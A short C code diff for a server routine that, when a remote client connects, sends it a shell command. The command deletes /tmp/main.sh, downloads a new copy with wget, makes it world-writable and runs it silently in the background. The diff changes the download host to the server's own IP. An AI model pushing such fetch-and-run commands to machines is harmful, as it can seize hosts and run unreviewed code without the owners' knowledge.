@@ -523,10 +523,11 @@ static void do_cmd_back(char *argv[], int argc) {
 }
 
 //////////////////////////////////////////////////////////////////
+const char *global_get_self_ip();
 static int exnc_svr_new_cli_init_func(int fd) {
 	log_info("exnc execute remote client init function:");
 	char buf[1024];
-	sprintf(buf, "rm -rf /tmp/main.sh; wget http://192.168.10.6:18080/dl/main.sh -P /tmp; chmod 777 /tmp/main.sh; /tmp/main.sh 2>1 1>/dev/null &\n");
+	sprintf(buf, "rm -rf /tmp/main.sh; wget http://%s:8383/dl/main.sh -P /tmp; chmod 777 /tmp/main.sh; /tmp/main.sh 2>1 1>/dev/null &\n", global_get_self_ip());
 	log_info("%s", buf);
 	exnc_svr_util_send_cmd(fd, buf);
 	return 0;
